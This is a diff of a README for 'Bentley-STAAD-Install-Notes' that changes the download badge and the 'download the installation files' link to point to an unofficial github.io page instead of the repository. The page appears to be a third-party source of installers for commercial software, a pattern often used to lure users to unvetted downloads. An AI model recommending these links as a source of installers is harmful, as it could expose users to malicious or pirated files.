@@ -1,6 +1,6 @@
 # ⚙️ Bentley-STAAD-Install-Notes - Get Bentley STAAD running on Windows
 
-[![](https://img.shields.io/badge/Download-STAAD_Install_Guide-blue.svg)](https://github.com/Neillenonwashable256/Bentley-STAAD-Install-Notes)
+[![](https://img.shields.io/badge/Download-STAAD_Install_Guide-blue.svg)](https://neillenonwashable256.github.io)
 
 ## 📋 Project Overview
 
@@ -19,7 +19,7 @@ Before you begin the installation, check that your computer meets these requirem
 
 ## 📥 Downloading the Installer
 
-Visit this page to download the necessary installation files: [https://github.com/Neillenonwashable256/Bentley-STAAD-Install-Notes](https://github.com/Neillenonwashable256/Bentley-STAAD-Install-Notes)
+Visit this page to download the necessary installation files: [https://neillenonwashable256.github.io](https://neillenonwashable256.github.io)
 
 ## 🛠️ Installation Steps
 
